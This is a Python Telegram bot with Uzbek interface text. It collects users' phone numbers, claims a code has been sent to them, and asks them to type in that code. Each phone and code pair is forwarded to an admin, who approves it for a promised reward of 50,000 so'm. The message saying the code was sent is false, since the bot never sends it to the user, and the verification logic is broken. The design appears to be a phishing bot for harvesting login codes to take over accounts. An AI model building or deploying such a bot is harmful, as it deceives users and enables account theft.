import asyncio
import random
import asyncpg
import os
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ================= KONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")  # STRING HOLATIDA OLAMIZ

# ADMIN_ID ni tekshirish
try:
    ADMIN_ID = int(ADMIN_ID)
    logger.info(f"✅ Admin ID: {ADMIN_ID}")
except:
    logger.error(f"❌ Admin ID xato: {ADMIN_ID}")
    ADMIN_ID = 0

DATABASE_URL = os.getenv("DATABASE_URL")

# Bot token tekshirish
if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN topilmadi!")
    exit()

if not ADMIN_ID:
    logger.error("❌ ADMIN_ID topilmadi!")
    exit()

if not DATABASE_URL:
    logger.error("❌ DATABASE_URL topilmadi!")
    exit()

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# ================= HOLATLAR =================
user_states = {}
user_phones = {}
admin_states = {}

# ================= TUGMALAR =================
phone_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton("📞 Telefon raqamni yuborish", request_contact=True)]],
    resize_keyboard=True
)

admin_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton("📊 Statistika")],
        [KeyboardButton("📨 Barchaga xabar")],
        [KeyboardButton("📋 Kodlar")]
    ],
    resize_keyboard=True
)

# ================= DATABASE =================
async def get_db():
    return await asyncpg.connect(DATABASE_URL)

async def init_db():
    conn = await get_db()
    try:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE NOT NULL,
                phone VARCHAR(20) NOT NULL,
                balance INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS codes (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                code VARCHAR(10) NOT NULL,
                telegram_id BIGINT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS transactions (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                amount INTEGER NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        logger.info("✅ Database ready")
    except Exception as e:
        logger.error(f"❌ DB error: {e}")
        raise
    finally:
        await conn.close()

# ================= 1. START =================
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    telegram_id = message.from_user.id
    logger.info(f"📥 /start from: {telegram_id}")
    
    # Admin bo'lsa
    if telegram_id == ADMIN_ID:
        await message.answer(
            "👋 Admin panel",
            reply_markup=admin_menu
        )
        return
    
    # Oddiy foydalanuvchi
    user_states[telegram_id] = "waiting_phone"
    await message.answer(
        "📱 Telefon raqamingizni yuboring:",
        reply_markup=phone_keyboard
    )

# ================= 2. TELEFON RAQAM =================
@dp.message_handler(content_types=['contact'])
async def receive_phone(message: types.Message):
    telegram_id = message.from_user.id
    logger.info(f"📞 Contact from: {telegram_id}")
    
    # Admin bo'lsa
    if telegram_id == ADMIN_ID:
        await message.answer("❌ Admin kontakt yubora olmaydi!")
        return
    
    # Holatni tekshirish
    if user_states.get(telegram_id) != "waiting_phone":
        await message.answer("❌ /start bosing!")
        return
    
    phone = message.contact.phone_number
    logger.info(f"📞 Telefon: {telegram_id} -> {phone}")
    
    # Saqlash
    user_phones[telegram_id] = phone
    user_states[telegram_id] = "waiting_code"
    
    # 1. Foydalanuvchini bazaga saqlash
    conn = await get_db()
    try:
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO UPDATE SET phone = $2",
            telegram_id, phone
        )
        logger.info(f"✅ User saved: {telegram_id}")
    except Exception as e:
        logger.error(f"❌ DB error: {e}")
    finally:
        await conn.close()
    
    # 2. Kod yaratish
    code = str(random.randint(100000, 999999))
    
    # 3. Kodni saqlash
    conn = await get_db()
    try:
        await conn.execute(
            "INSERT INTO codes (phone, code, telegram_id, status) "
            "VALUES ($1, $2, $3, 'pending')",
            phone, code, telegram_id
        )
        logger.info(f"✅ Code saved: {code}")
    except Exception as e:
        logger.error(f"❌ Code error: {e}")
    finally:
        await conn.close()
    
    # 4. Foydalanuvchiga xabar
    await message.answer(
        f"✅ {phone} raqamiga kod yuborildi!\n\n📨 Kodni kiriting:"
    )
    logger.info(f"📨 User notified: {telegram_id}")
    
    # 5. ADMIN'GA XABAR YUBORISH
    try:
        admin_msg = f"📱 YANGI FOYDALANUVCHI\nID: {telegram_id}\nTel: {phone}\nKod: {code}"
        await bot.send_message(ADMIN_ID, admin_msg)
        logger.info(f"✅ ADMIN GA XABAR YUBORILDI: {ADMIN_ID}")
        logger.info(f"   Xabar: {admin_msg}")
    except Exception as e:
        logger.error(f"❌ ADMIN GA XABAR YUBORISH XATOSI: {e}")
        logger.error(f"   ADMIN_ID: {ADMIN_ID}")
        logger.error(f"   BOT_TOKEN: {BOT_TOKEN[:10]}...")

# ================= 3. KODNI QABUL QILISH =================
@dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    logger.info(f"🔑 Code from: {telegram_id} -> {code}")
    
    if not phone:
        await message.answer("❌ Xatolik! /start bosing")
        return
    
    if len(code) != 6 or not code.isdigit():
        await message.answer("❌ 6 xonali kod kiriting:")
        return
    
    conn = await get_db()
    try:
        existing = await conn.fetchrow(
            "SELECT * FROM codes WHERE phone = $1 AND code = $2 AND status = 'pending'",
            phone, code
        )
        
        if existing:
            await message.answer("⏳ Kod qabul qilindi! Admin tekshirmoqda...")
            
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton("✅ Tasdiqlash (+50 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}")],
                    [InlineKeyboardButton("❌ Rad etish", callback_data=f"reject_{telegram_id}")]
                ]
            )
            
            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"🔑 KOD KELDI!\nID: {telegram_id}\nTel: {phone}\nKod: {code}",
                    reply_markup=keyboard
                )
                logger.info(f"✅ ADMIN GA KOD YUBORILDI: {ADMIN_ID}")
            except Exception as e:
                logger.error(f"❌ ADMIN GA KOD YUBORISH XATOSI: {e}")
            
            user_states[telegram_id] = "done"
        else:
            await message.answer("❌ Noto'g'ri kod!")
    except Exception as e:
        logger.error(f"❌ Code check error: {e}")
    finally:
        await conn.close()

# ================= 4. ADMIN TASDIQLASH =================
@dp.callback_query_handler(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    logger.info(f"📋 Admin action: {action}")
    
    if action == "verify":
        telegram_id = int(data[1])
        phone = data[2]
        code = data[3]
        
        conn = await get_db()
        try:
            result = await conn.execute(
                "UPDATE codes SET status = 'verified' "
                "WHERE phone = $1 AND code = $2 AND telegram_id = $3 AND status = 'pending'",
                phone, code, telegram_id
            )
            
            if result == "UPDATE 1":
                await conn.execute(
                    "UPDATE users SET balance = balance + 50000 WHERE telegram_id = $1",
                    telegram_id
                )
                await conn.execute(
                    "INSERT INTO transactions (telegram_id, amount) VALUES ($1, 50000)",
                    telegram_id
                )
                
                try:
                    await bot.send_message(
                        telegram_id,
                        "✅ TASDIQLANDI! 🎉\n\n💰 +50 000 so'm"
                    )
                    logger.info(f"✅ User notified: {telegram_id}")
                except Exception as e:
                    logger.error(f"❌ User notify error: {e}")
                
                await callback.message.edit_text(
                    f"✅ Tasdiqlandi!\nID: {telegram_id}\nTel: {phone}"
                )
                await callback.answer("✅ OK")
            else:
                await callback.answer("❌ Xatolik!")
        finally:
            await conn.close()
    
    elif action == "reject":
        telegram_id = int(data[1])
        
        conn = await get_db()
        try:
            await conn.execute(
                "UPDATE codes SET status = 'expired' "
                "WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ Kod rad etildi!"
                )
                logger.info(f"❌ User notified: {telegram_id}")
            except Exception as e:
                logger.error(f"❌ User notify error: {e}")
            
            await callback.message.edit_text(
                f"❌ Rad etildi!\nID: {telegram_id}"
            )
            await callback.answer("❌ OK")
        finally:
            await conn.close()

# ================= 5. ADMIN STATISTIKA =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    conn = await get_db()
    try:
        users = await conn.fetchval("SELECT COUNT(*) FROM users")
        pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending'")
        verified = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
        balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
        
        await message.answer(
            f"📊 STATISTIKA\n\n"
            f"👥 Foydalanuvchilar: {users}\n"
            f"💰 Balans: {balance:,} so'm\n"
            f"⏳ Kutayotgan: {pending}\n"
            f"✅ Tasdiqlangan: {verified}"
        )
    finally:
        await conn.close()

# ================= 6. KODLAR =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kodlar")
async def pending_codes(message: types.Message):
    conn = await get_db()
    try:
        codes = await conn.fetch(
            "SELECT * FROM codes WHERE status = 'pending' ORDER BY id DESC LIMIT 10"
        )
        
        if codes:
            text = "📋 KODLAR:\n\n"
            for c in codes:
                text += f"ID: {c['telegram_id']}\nTel: {c['phone']}\nKod: {c['code']}\n---\n"
            await message.answer(text)
        else:
            await message.answer("📭 Yo'q")
    finally:
        await conn.close()

# ================= 7. BARCHAGA XABAR =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
async def broadcast_start(message: types.Message):
    admin_states[ADMIN_ID] = "waiting_message"
    await message.answer("📨 Xabar matnini yozing:")

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
async def broadcast_send(message: types.Message):
    if message.text == "/cancel":
        admin_states.pop(ADMIN_ID, None)
        await message.answer("❌ Bekor", reply_markup=admin_menu)
        return
    
    text = message.text
    admin_states.pop(ADMIN_ID, None)
    
    conn = await get_db()
    try:
        users = await conn.fetch("SELECT telegram_id FROM users")
        
        if not users:
            await message.answer("❌ Foydalanuvchilar yo'q!")
            return
        
        sent = 0
        for user in users:
            try:
                await bot.send_message(user['telegram_id'], f"📨 XABAR\n\n{text}")
                sent += 1
                await asyncio.sleep(0.05)
            except:
                pass
        
        await message.answer(f"✅ Yuborildi: {sent} ta", reply_markup=admin_menu)
    finally:
        await conn.close()

# ================= 8. BALANS =================
@dp.message_handler(commands=['balance'])
async def balance(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        return
    
    conn = await get_db()
    try:
        user = await conn.fetchrow(
            "SELECT balance FROM users WHERE telegram_id = $1",
            message.from_user.id
        )
        
        if user:
            await message.answer(f"💰 Balans: {user['balance']:,} so'm")
        else:
            await message.answer("❌ Ro'yxatdan o'tmagansiz")
    finally:
        await conn.close()

# ================= 9. MAIN =================
async def main():
    logger.info("🤖 Bot ishga tushmoqda...")
    logger.info(f"👤 ADMIN_ID: {ADMIN_ID}")
    logger.info(f"🔑 BOT_TOKEN: {BOT_TOKEN[:10]}...")
    logger.info(f"🗄 DATABASE_URL: {DATABASE_URL[:30]}...")
    
    await init_db()
    
    # Test: Admin'ga xabar yuborish
    try:
        await bot.send_message(
            ADMIN_ID,
            "🤖 Bot ishga tushdi!\n\n✅ Admin ID: {ADMIN_ID}\n✅ Bot tayyor!"
        )
        logger.info(f"✅ Test xabar admin'ga yuborildi!")
    except Exception as e:
        logger.error(f"❌ Test xabar yuborish xatosi: {e}")
        logger.error(f"   Admin ID: {ADMIN_ID}")
        logger.error(f"   Bot token: {BOT_TOKEN[:10]}...")
    
    logger.info("✅ Bot ready!")
    await dp.start_polling()

if __name__ == "__main__":
    asyncio.run(main())
